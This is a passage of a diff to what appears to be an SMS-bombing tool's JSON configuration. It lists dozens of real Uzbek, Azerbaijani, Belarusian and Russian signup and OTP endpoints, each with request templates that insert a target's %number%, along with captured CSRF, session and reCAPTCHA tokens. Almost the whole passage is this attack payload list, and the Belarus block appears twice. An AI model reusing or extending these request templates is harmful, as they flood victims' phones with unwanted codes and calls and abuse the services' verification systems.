QrRkdaODBneEh3WlZrYk1hUW12a0hadjAyeTFjc2hRMHpjcVNDZlQ1clZYUndkWkZBNFVVc0NJNmpoTEdyZUpsdEZiS1dzUk9lSUMyZkliaWwvNU1GY0NtOVVkQnArOW15Myt1R2VNQlVSMEVzRUpwczErNlJITW0zamlvWTBrNFVVeHliZkNGWU9XUTlEUEgxL2ZVcXEwTE1qSHJCRVdyRkcyaTFKUkdQMVhKRFVwSmZYZEN6QUY3WFVSOEEvdm9zNFkzbUVTT3dpUmtJZG14Y0tudjRsS2IrZm5KZC9INFFIblV4SmdnbXQ3VTh4ZkxnUk01OHJkYm1vVjcyMThodGJyQm15WWpKTWdXTzZlb25ZK05CSkZVVVZQMVZSTEdiUWRCdlhNSXpEVllEMUNJSFdTZC9QNzRqRldVZ2Q4MGNoZ3kybXRjbDdDSjlJeVhYczVhaGVUWStTeHZwSmJtbUFVOGZvTTdFblkwOFcrVnBLekdWSTNNbkhwVWhIY01Bcm9XcnIxY3FQV2t0cE82cGxiR2xic0RsWEZ1N1RDRnowUHhXcjYrY3RpRkNJb2F3b1JsZ0VyOFlzSmdkMkcxb3ovUGpIMVpPZFhxTFB0bTdpK2NGYVlLVDE2bnNKMSsrL0t0WlZrOWdoWWltbis0d2d5WlJON2RidnNyWjRLeldpOSt1V2ZKM2EzZ2pCeDVqU0srM2o1c2xrNlNucGlrMlVWRUJJN0hSazkybE9KU2lzUkgzQmFtREw4ZFJWcDFHNytvbnJhV1NNa1BpNk4zblRjNE15QUhJTkNRS0xvZDlMaml0UXlXUUNVM0phVFczTWRnSnVVMWM2NmtCWDNXK1VET0N0b1RBRDREc0RFaEJTUVlNb0trNjF6eitIL0VPLzE4S1NOSFAraFdNMEp4K2hYMms3czJtRzhHcjBreUh4NTlUZERtUy84KytaUjZPTnJDV2NiWjJqK25nU2JJOWIvUHQxaU4rNVZxRTNtQ1kxUGZGL3h1cG5Fc2c4QkxQQmtuNXZVWXFJWDJ4Z25BRTZHQllyeU1SclB5akJqNUtlSFB3cEpnTmZ2RTVJN2lzb29QclUyTHQ0NG9EYkRhYVhsNGZSL25VbHV0blFxVjEvNXlwK21RSW1veWRWWDVNWFJTNTJjSk5tc0RITWJ6NGxzQm12T0JYbjFFQzA1cjZ6cUVncnpiL2NTa29aRmdLT2E4WDEvSXQyMFFTK2Y2WlFyVmY0VEQyNmN2RnEzSVJSaXY1RG1kcGJ6SHprUS9iTGE4WDFlZDlFb093a1ZKdkdYRDhqbUFqOTJPYnR1QkdPMVBDT0lDYXc4NFBmajZ6NEdqY21tNkt2ZG43QVJXYXhiSmswUEJ5WXZ5MWROdmFSN3hPQTNpWlBLWVlwMDYya3RIZHVaeHU1dlNlTnRxMkk1U0JKMEZZYmcwekU3Q3dvVXBZUEpVRnY2Sk9jWldubEJ0di9haE0xMzM3WWRzSlhnSmRTbGlPZmtRV2h2amZVRlZrTm9XdGJsa0g2MDBSUGNMMGIxd2RNRktkZ0tRSnlhV2pIalBuZWVQelQrRndXTXBMNm1URzRLdVVpaDI2UG1vdC9iekpmNUxzSkZNdm1ScE9ucG5pRGRCL3NIOWJIZTBpRVVKWWIwOW1FdXZKVUxRdGpNalcyMDBjd2N6ZHZoOW8raGVOc0tBMEhJQm1DWjZtc1dlVW9YcCtqWFBIbDFQNURhYVQvU095c1RqWERZZGF5QW1wWlZJY2ZiWHhseDRjeXYzVWJRRFNRbGRNRkFSMm12T3Y2YjJaV25ZMmVNKzZIZGJ2MFJIcmNmVWpzV3cwNllkYXlUVmd6RFpMK0dFVkU4ZklNSjJ1T0xadmRQNndvS21ra3crcjVDVG9NUmYzeHJMclN6Uk91WXVGNUZnaG94TFJJb2NzeWQ1R2VDT3ZzVFpWSlNSQjd1QmZNMGdsUDNRT1hEeEtKWHExWjJSckgzcHFwWkNnNWh5YzV5OVl4anJ3OVdCZ0cwbmY1cHBueU85V1Npbm90VCtwcktpODR6WXlVd1Y2T1F0eDF2NnRQQTA3ZzNRdGc5cDcrb0I3YWRjbWw0dFlKL2wxK3ZscFBXK045NElMMGpPK1lrODZ4Skk1R1BWSHNsMGhKZkNqRGFOVWFnT0JVdERzZTZPUmVwOFh0SWdkSkZpQXhWdUlmM2hUZUc5THp4WG5xL3JGVXI5ZWV3eFEyODhnRXQyeFE1Nytmd0YyT0lIL3BxVldCeVJyaWR2bTQyYWtIb041NmxTUGFWVWxLRmI3cjNqUEFtekR2aUhmaGk3VC9abzc4MzJqbXNTb1NFTWYxaVlnV3pVVDFpNGtBbmxtblFseTErM0MrcCtFMFZOM2dlY3VFeG9iNDJCdjRsb1g1VnFGY0FmbEZ6MEZKN0xXd1FSWGZXSjg5SHVvc2lWa3U4c09UMmhDdEdiVDY5ZGE3dmR5RStLUlBjR241YW52ZU8vU2JEajRKY0kzSkpHQVkyZEhFTWhjNU9WUVFNZ1p3S3RoSkRjSElYZWY1L3dFbjIzWHB1QnJUVVpyTDR6TkhKaWRWQ3djVFRyeklxNEdlYXNqNWNSRGJrdFk5RFM4OGd3IiwiZXhwIjoxNjcxMDU3MTUwLCJzaGFyZF9pZCI6NTM1NzY1NTksInBkIjowfQ.E4kYDjtsqzfUF8a7jHBghzPiwZ4G9xwR8P9SQ-Lrb98&submit=true",
+            "method": "post",
+            "ins":"###*********"
+            },
+
+        {
+            "url": "https://beepul.beeline.uz/api/api/Request/Send",
+            "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","content-type":"application/json; charset=utf-8"}],
+            "data": {"template":{"url":"api/v3/account/signup-1","method":2,"isAuth":true,"ModelType":1},"appId":"cmf3BxzpI+UO5irGIJUFBHEl0XBa5mQCejbhAvUG1ky1k6fhEde0lgbfLCbDKLgm6KwFNtIUxReNNrrqy89eRumzEpSJ1rOJKc0H4wli0SA2O8/pXP9trrQlwoNJrL5t","headers":{"MobappVersion":"3.1.2.210524","Mobplatform":"web","Moblang":"ru"},"params":null,"edata":null,"value":"{\"ctn\":\"%number%\"}","data":null,"options":null},
+            "method": "post",
+            "ins":"************"
+            },
+
+        {
+            "url": "https://bisyor.uz/verify?login=%number%",
+            "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5","Alt-Used":"bisyor.uz"}],
+            "string": "",
+            "method": "get",
+            "ins":"+*****-***-**-**"
+            },
+
+        {
+            "url": "https://baraka.uz/baraka/api/v1/mobile/auth/sms/send",
+            "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "null","Content-Type":"application/json;charset=utf-8","Alt-Used":"baraka.uz"}],
+            "data": {"number":"%number%"},
+            "method": "post",
+            "ins":"(***) **-***-**-**"
+            },
+
+        {
+            "url": "https://tengebank.uz/ru/auth",
+            "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-OCTOBER-REQUEST-HANDLER":"onRegister","X-Requested-With":"XMLHttpRequest"}],
+            "data": "validation%5Bregphone%5D=&regphone=%number%&_token=iGHlrTTdliUWTBAt5Vsjm0c1aDLi7wNlFt4YpM1e&_session_key=fgwANNWEagD2iBklZ6Z7U6ugrQG62KZ82l7dWx7b",
+            "method": "post",
+            "ins":"+***(***)+***-**-**"
+            },
+
+        {
+            "url": "https://merchant.payme.uz/api/users.create",
+            "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/json"}],
+            "json": {"jsonrpc":"2.0","method":"users.create","params":{"phone":"%number%","password":"%password%"}},
+            "method": "post",
+            "ins":"************"
+            },
+
+        {
+            "url": "https://www.zoodmall.uz/api/generate-otp?platform=web",
+            "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/json","SSR":"false","X-lang":"ru","X-marketCode":"UZ","deviceId":"b5e1348a-1903-46e9-81cf-c6f5d36a160a","X-XSRF-TOKEN":"eyJpdiI6IlBoV3dwS29USjZadU1KckRSZUdmblE9PSIsInZhbHVlIjoiUFVSSHhGVlVXc2NkNkR2TVFBUDBDQXltQ1BtQTd0R0QrdXd2Uml5Unkrc205R2Y2Nkg2SWFPQUdYdU1aaTUyT0tSRXcrTjFzOW14Mk9YbUh4RGJNbG4yQnN2L3ZmeTZicHBST2kxQU0zRkN4Z2h5djRTL29wcmk2SThZR3VLd2giLCJtYWMiOiJlY2RmNjc1YzllNWM2YTM3Y2NkNWVjZmIwYmZmNmQ4ZjgxNDk1MmY2YWNjYjA1ODk2MTk5OWQ2YzIwYjA0MTYzIn0="}],
+            "json": {"mobile":"%number%"},
+            "method": "post",
+            "ins":"+************"
+            },
+
+        {
+            "url": "https://id.avtoelon.uz/getInfoAuth.json",
+            "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded;charset=utf-8"}],
+            "data": "project=avtoelon&login=%number%&csrf=anl1Y0RTbHMxRFhET3haMkozZ2cxUT09&restore=0&iteration=primary&re_captcha_token=03AD1IbLDDDSnz8gWQ7NYS-uuCThpH0d6Zx_WKM-85g34SWEvO19u3WZiF8EJ7UsMm-d2m31pBRnE_qXbUFFGE-bgj3ouq76MLpYRELZEx5RNkSVrW95YTfSixW_mv13wn5YR430wHb-F0LATbfLS2oPkSPIxpvsXU8syF3XBeJeAUxPS1f9P4aJkkIn1NlDzo5bXXBFBmM18HTk83QL26qEXcV4AW6eAjVVO1Tmb8PojsxoKehbUMSp69QTG0PhRY9pDgl772KKOdWFswpvtXvVN4NFowJjqFZldJZSavUefCw4K5kSguSRwoD9AEQliANgBVughsCvka_X82QHdAZLMjiSxcnvDt32-kd-u7Vx0b5XcbSR3tD6y9JL1C93XYN0vEN8O7_jFyd5Xshu7GYqSPIdU28JXcvk8xYyftxxfyHBzAUD_zZgcMWjKr_IH5BQlCJcfV-uUO3XY6IRWxOYbUAjrOiPRzEgJM0UMWdEDHdS7dsqtdOWWiW_Deaini8qVHH-aZ_REM2yJFaaqpBlF6TFRc-ZwxDg",
+            "method": "post",
+            "ins":"************"
+            },
+
+        {
+            "url": "https://id.egov.uz/api/v1/secure/check/phone",
+            "headers": [{"User-Agent": " ", "Accept":"application/json", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/json"}],
+            "json": {"phone":"%number%"},
+            "method": "post",
+            "ins":"+************"
+            },
+
+        {
+            "url": "https://customer.api.delever.uz/v1/customers/phone",
+            "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/json","Shipper":"d0d0c7c9-e047-4ad8-9674-a94a27e3da73","Platform":"website"}],
+            "json": {"phone":"%number%"},
+            "method": "post",
+            "ins":"+**************"
+            },
+                  {
                       "url": "https://io.bellissimo.uz/api/verify",
                       "headers": [{"User-Agent": " ", "Accept":"application/json", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/json"}],
                       "json": {"phone":"%number%"},
@@ -744,6 +1280,41 @@
                  ]
       },
 
+
+      "994":{
+          "mix": [{
+             "url":"https://my.telegram.org/auth/send_password",
+             "headers":[{"User-Agent":" ",  "DNT":"1"}],
+             "data":"phone=%number%",
+             "method":"post",
+             "ins":"*************"
+           },
+           {
+            "url": "https://tap.az/authentications",
+            "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/json","x-csrf-token":"Ebkj7dvMHjCh3q50wcPvXmY7GB/ro8NAu7LPh4BmTDQyQbJ4caCS4L17x68N+QhI3qgMAki5hH5Q/eFMWme79w=="}],
+            "json": {"phone":"%number%","isCookieEnabled":true},
+            "method": "post",
+            "ins":"###**********"
+            }],
+          "calls": [],
+          "sms": [
+            {
+               "url":"https://my.telegram.org/auth/send_password",
+               "headers":[{"User-Agent":" ",  "DNT":"1"}],
+               "data":"phone=%number%",
+               "method":"post",
+               "ins":"*************"
+             },
+             {
+              "url": "https://tap.az/authentications",
+              "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/json","x-csrf-token":"Ebkj7dvMHjCh3q50wcPvXmY7GB/ro8NAu7LPh4BmTDQyQbJ4caCS4L17x68N+QhI3qgMAki5hH5Q/eFMWme79w=="}],
+              "json": {"phone":"%number%","isCookieEnabled":true},
+              "method": "post",
+              "ins":"###**********"
+              }
+            ]
+      },
+
       "375":{
           "mix": [{
                       "url": "https://sosedi.by/local/api/smsSend.php",
@@ -752,6 +1323,86 @@
                       "method": "post",
                       "ins": "+*** (**) *******"
                     },
+                    {
+                        "url": "https://my.deal.by/remote/auth/register_customer?locale=ru",
+                        "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/json; charset=UTF-8", "X-Requested-With":"XMLHttpRequest", "X-CSRFToken":"3496310c62d34dceabe34fbfdcd0addd"}],
+                        "json": {"phone":"%number%","otp":"","first_name":"%ru_name%","last_name":"ru_re_name","source":"header","subscription":true,"skip_name":false,"pow_complexity":"18:web.Fnhq_A.tLoig8WGeKpwcQBLj1SYDUlGIis","pow_prefix":"BQ2MVECY12ZTYVDOUDC5FSXCNGNKD4588VUX6QPLX2RG79WOSREEW3V4UJSYR89S.Fnhq_A.a5j6ieVWuQ20OICbfV2Z2LRPBso","pow_nonce":"000001850544001fbc7a5e7d981fd035"},
+                        "method": "post",
+                        "ins":"+************"
+                        },
+
+
+                    {
+                        "url": "https://www.slivki.by/login/phone/send-code",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"text/plain;charset=UTF-8"}],
+                        "data": {"token":"597dcee7dea6eb095d109c9955766460.X8u-EFiT0Y1zDCx3ejHONWPRS9PpFlmN6TCqoBKKm2M.LoHYIT-ls8ULPWokQ1mgDBuGf52GeTS9rx3N9mH4_w4Ih4h0Itqf7BA6FA","phoneNumber":"%number%"},
+                        "method": "get",
+                        "ins":"+********-**-**"
+                        },
+
+                    {
+                        "url": "https://tokiny.by/?ajax=1&task=sendVerificationCode",
+                        "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/json;charset=utf-8"}],
+                        "data": {"tel":"%number%"},
+                        "method": "post",
+                        "ins":"+************"
+                        },
+
+                    {
+                        "url": "https://burger-king.by/bitrix/services/main/ajax.php?mode=class&c=gmi%3Aauth&action=auth",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "Bx-ajax":"true","Content-Type":"application/x-www-form-urlencoded"}],
+                        "data": "fields[action]=send_code&fields[phone]=%number%&SITE_ID=s1&sessid=c71df05bebc582dba6c044ccced53b62",
+                        "method": "post",
+                        "ins":"+***(**) *******"
+                        },
+
+                    {
+                        "url": "https://rest.eurotorg.by/10201/Json?What=DiscountClub.PutManDiscountShort",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"text/plain;charset=UTF-8"}],
+                        "data": {"CRC":"","Packet":{"MethodName":"DiscountClub.PutManDiscountShort","JWT":null,"ServiceNumber":"48AF47B3-811B-47D4-82A7-21AB04504C4C","Data":{"Name1":"%ru_name%","Name2":"%re_ru_name%","Phone1":"%number%","EMail":"-1","Address4Id":"84200","Address3Name":"12","Address2Name":"","Address1Name":"","Porch":"","Floorx":"","Password":"Sh4N6MVgP9wzd3S","SourceName":"evropochta.by","SubscribeSms":1,"SubscribeEmail":1}}},
+                        "method": "post",
+                        "ins":"************"
+                        },
+
+                    {
+                        "url": "https://proportsiya.by/cabinet/register",
+                        "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/x-www-form-urlencoded"}],
+                        "data": "lastname=%re_ru_name%&name=%ru_name%&parentname=%re_re_ru_name%&phone=%number%&email=&city=%D0%9C%D0%B8%D0%BD%D1%81%D0%BA&street=%D0%9A%D0%B8%D1%81%D0%B5%D0%BB%D0%B5%D0%B2%D0%B0&house=1&building=&flat=&entrance=&floor=&doorcode=&address_note=&g-recaptcha-response=03AEkXODDN4Gnzcr_Ajgisk1eHTJrXI5j1xCGZYi5vm_dWDD8ihKmgeKQMTsIQHwabPYxwsafRRFa0tRGUgVPQYJYAgS-Gu2s2XP0ZGQtFTyacrXmuPVQu71B6MogXohv10gFkE12-lW8DqirEWZG3XxHF86L7CcOxR5h2hkHMP9RpZoKJlSRYjMt2mTJEY-Sxlwe4xMEh5WgGAPDDWx0KLQYZiAj6Km_Z26SCYXoohZhxntTviWj19-3PYhDbhy3gGI0SWPSDd5jYnKDXFHQ7uU-ahzbzky9BDFy01cyaS9A0q35O-ziYgLwJdYFRRJjUlilq_kdaoEafBTYW77SwS9EWMRCAzVpcPjyx6U8HsEAYjdWAO9hfLCK5BcYuL_bGbwqVftNZA-QPbwXpdrNhSPsXVwaUWycpaAL4MBwFvcID9yWMCjXzH3MTuJSEvZNb1BIATdPMAr5RodIUAuq12D0C90bPPFYMwLmZbu0q61WiNOuUkkSLiS-SyLvFK-kZv7a3e1dUB5y4ECZdtEt7MHuNSTMMGL7aaA",
+                        "method": "post",
+                        "ins":"+***(**)***-**-**"
+                        },
+
+                    {
+                        "url": "https://green-dostavka.by/api/v1/auth/request-confirm-code/",
+                        "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/json"}],
+                        "json": {"phoneNumber":"%number%"},
+                        "method": "post",
+                        "ins":"+*** ** *** ** **"
+                        },
+
+                    {
+                        "url": "https://vprok.prostore.by/get-assistant-code",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With":"XMLHttpRequest"}],
+                        "data": "register_phone=%number%&_token=7xVPFPIRLqyPVt3sd68Uf6nKB5icPo9LLOr692qp",
+                        "method": "post",
+                        "ins":"###(**)+***+**+**"
+                        },
+
+                    {
+                        "url": "https://shop.by/management/user/register/?phone=2&lctn=shopby/",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
+                        "data": "LRegisterForm%5Bphone%5D=%number%&LRegisterForm%5Bpersonal_data_privacy_policy%5D=0&LRegisterForm%5Bpersonal_data_privacy_policy%5D=1",
+                        "method": "post",
+                        "ins":"+***+(**)+***-**-**"
+                        },
+
+                    {
+                        "url": "https://passport.yandex.by/registration-validations/phone-confirm-code-submit",
+                        "headers": [{"User-Agent": " ", "Accept":"application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
+                        "data": "csrf_token=05559d597084d4ccb132426f27eeb9ff45496bfe%3A1671122223325&track_id=a1eb4917e3be0d1d480bb60c3da0bf1231&display_language=ru&number=%number%&confirm_method=by_sms&isCodeWithFormat=true",
+                        "method": "post",
+                        "ins":"+************"
+                        },
                     {
                       "url": "https://api.av.by/auth/phone/sign-up",
                       "headers": [{"User-Agent": " ", "Accept": "*/*","Accept-Language": "en-US,en;q=0.5","x-device-type":"web.desktop","Content-Type":"application/json"}],
@@ -770,6 +1421,86 @@
                       "ins": "+*** (**) *******"
                     },
                     {
+                        "url": "https://my.deal.by/remote/auth/register_customer?locale=ru",
+                        "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/json; charset=UTF-8", "X-Requested-With":"XMLHttpRequest", "X-CSRFToken":"3496310c62d34dceabe34fbfdcd0addd"}],
+                        "json": {"phone":"%number%","otp":"","first_name":"%ru_name%","last_name":"ru_re_name","source":"header","subscription":true,"skip_name":false,"pow_complexity":"18:web.Fnhq_A.tLoig8WGeKpwcQBLj1SYDUlGIis","pow_prefix":"BQ2MVECY12ZTYVDOUDC5FSXCNGNKD4588VUX6QPLX2RG79WOSREEW3V4UJSYR89S.Fnhq_A.a5j6ieVWuQ20OICbfV2Z2LRPBso","pow_nonce":"000001850544001fbc7a5e7d981fd035"},
+                        "method": "post",
+                        "ins":"+************"
+                        },
+
+
+                    {
+                        "url": "https://www.slivki.by/login/phone/send-code",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"text/plain;charset=UTF-8"}],
+                        "data": {"token":"597dcee7dea6eb095d109c9955766460.X8u-EFiT0Y1zDCx3ejHONWPRS9PpFlmN6TCqoBKKm2M.LoHYIT-ls8ULPWokQ1mgDBuGf52GeTS9rx3N9mH4_w4Ih4h0Itqf7BA6FA","phoneNumber":"%number%"},
+                        "method": "get",
+                        "ins":"+********-**-**"
+                        },
+
+                    {
+                        "url": "https://tokiny.by/?ajax=1&task=sendVerificationCode",
+                        "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/json;charset=utf-8"}],
+                        "data": {"tel":"%number%"},
+                        "method": "post",
+                        "ins":"+************"
+                        },
+
+                    {
+                        "url": "https://burger-king.by/bitrix/services/main/ajax.php?mode=class&c=gmi%3Aauth&action=auth",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "Bx-ajax":"true","Content-Type":"application/x-www-form-urlencoded"}],
+                        "data": "fields[action]=send_code&fields[phone]=%number%&SITE_ID=s1&sessid=c71df05bebc582dba6c044ccced53b62",
+                        "method": "post",
+                        "ins":"+***(**) *******"
+                        },
+
+                    {
+                        "url": "https://rest.eurotorg.by/10201/Json?What=DiscountClub.PutManDiscountShort",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"text/plain;charset=UTF-8"}],
+                        "data": {"CRC":"","Packet":{"MethodName":"DiscountClub.PutManDiscountShort","JWT":null,"ServiceNumber":"48AF47B3-811B-47D4-82A7-21AB04504C4C","Data":{"Name1":"%ru_name%","Name2":"%re_ru_name%","Phone1":"%number%","EMail":"-1","Address4Id":"84200","Address3Name":"12","Address2Name":"","Address1Name":"","Porch":"","Floorx":"","Password":"Sh4N6MVgP9wzd3S","SourceName":"evropochta.by","SubscribeSms":1,"SubscribeEmail":1}}},
+                        "method": "post",
+                        "ins":"************"
+                        },
+
+                    {
+                        "url": "https://proportsiya.by/cabinet/register",
+                        "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/x-www-form-urlencoded"}],
+                        "data": "lastname=%re_ru_name%&name=%ru_name%&parentname=%re_re_ru_name%&phone=%number%&email=&city=%D0%9C%D0%B8%D0%BD%D1%81%D0%BA&street=%D0%9A%D0%B8%D1%81%D0%B5%D0%BB%D0%B5%D0%B2%D0%B0&house=1&building=&flat=&entrance=&floor=&doorcode=&address_note=&g-recaptcha-response=03AEkXODDN4Gnzcr_Ajgisk1eHTJrXI5j1xCGZYi5vm_dWDD8ihKmgeKQMTsIQHwabPYxwsafRRFa0tRGUgVPQYJYAgS-Gu2s2XP0ZGQtFTyacrXmuPVQu71B6MogXohv10gFkE12-lW8DqirEWZG3XxHF86L7CcOxR5h2hkHMP9RpZoKJlSRYjMt2mTJEY-Sxlwe4xMEh5WgGAPDDWx0KLQYZiAj6Km_Z26SCYXoohZhxntTviWj19-3PYhDbhy3gGI0SWPSDd5jYnKDXFHQ7uU-ahzbzky9BDFy01cyaS9A0q35O-ziYgLwJdYFRRJjUlilq_kdaoEafBTYW77SwS9EWMRCAzVpcPjyx6U8HsEAYjdWAO9hfLCK5BcYuL_bGbwqVftNZA-QPbwXpdrNhSPsXVwaUWycpaAL4MBwFvcID9yWMCjXzH3MTuJSEvZNb1BIATdPMAr5RodIUAuq12D0C90bPPFYMwLmZbu0q61WiNOuUkkSLiS-SyLvFK-kZv7a3e1dUB5y4ECZdtEt7MHuNSTMMGL7aaA",
+                        "method": "post",
+                        "ins":"+***(**)***-**-**"
+                        },
+
+                    {
+                        "url": "https://green-dostavka.by/api/v1/auth/request-confirm-code/",
+                        "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/json"}],
+                        "json": {"phoneNumber":"%number%"},
+                        "method": "post",
+                        "ins":"+*** ** *** ** **"
+                        },
+
+                    {
+                        "url": "https://vprok.prostore.by/get-assistant-code",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With":"XMLHttpRequest"}],
+                        "data": "register_phone=%number%&_token=7xVPFPIRLqyPVt3sd68Uf6nKB5icPo9LLOr692qp",
+                        "method": "post",
+                        "ins":"###(**)+***+**+**"
+                        },
+
+                    {
+                        "url": "https://shop.by/management/user/register/?phone=2&lctn=shopby/",
+                        "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
+                        "data": "LRegisterForm%5Bphone%5D=%number%&LRegisterForm%5Bpersonal_data_privacy_policy%5D=0&LRegisterForm%5Bpersonal_data_privacy_policy%5D=1",
+                        "method": "post",
+                        "ins":"+***+(**)+***-**-**"
+                        },
+
+                    {
+                        "url": "https://passport.yandex.by/registration-validations/phone-confirm-code-submit",
+                        "headers": [{"User-Agent": " ", "Accept":"application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
+                        "data": "csrf_token=05559d597084d4ccb132426f27eeb9ff45496bfe%3A1671122223325&track_id=a1eb4917e3be0d1d480bb60c3da0bf1231&display_language=ru&number=%number%&confirm_method=by_sms&isCodeWithFormat=true",
+                        "method": "post",
+                        "ins":"+************"
+                        },
+                    {
                       "url": "https://api.av.by/auth/phone/sign-up",
                       "headers": [{"User-Agent": " ", "Accept": "*/*","Accept-Language": "en-US,en;q=0.5","x-device-type":"web.desktop","Content-Type":"application/json"}],
                       "json": {"googleRecaptcha2InvisibleToken":"03AEkXODBmORK4JGwdPTv3G5zPF-BC85LZoBGwstW5Axb_vUvrkUv2f9b-aPfD-nQfMOq3wb7rZZIZSgYRPfv0T-lnHU8Oj8zUmca6k0ce0CLz7sM_Qs32fU-G1b0Rk9CYjsHaZsm42gkGiI3qLmy5r-jpCiv0-9uxO3Gc5w1rsE_tsCQ92dcyWxf8hbPNcdG0ic4T_p9XFvg7QSOSD_lhTlxEYJYiAGnxU9RM32Xo2sbov3q51lLkxiybfYUOFHC6lZBPLG3i57bMh9_5EH3LcLiV3YpSWlf-4vpyAfBo3-qtu61cBDQc5zdeY8O1rKyQzgCqfpAtKfwpyBs6855oqprga-rfLMU7qu20dRW7vBE-uJcZknEyopNBvG8Ww5LxT23-ZLC5wscuyggMUa0k4MmCNuaUxXe32z2L9WqCNL4P4fjlg9oD-_oNpp252CGrsewHSNHnY15K7R4ADvMzWhNqHgseQ9SikXsjYl1lsKFbL2uD1dXzYOMB2X9DKsmB7fJgx8fzwUk1","name":"%ru_name%","password":"%password%","phone":{"country":1,"number":"%number%"},"userEula":{"accepted":true}},
@@ -782,6 +1513,69 @@
 
       "7":{
          "mix": [{
+             "url": "https://login.aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init?_bx-v=2.2.3",
+             "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", 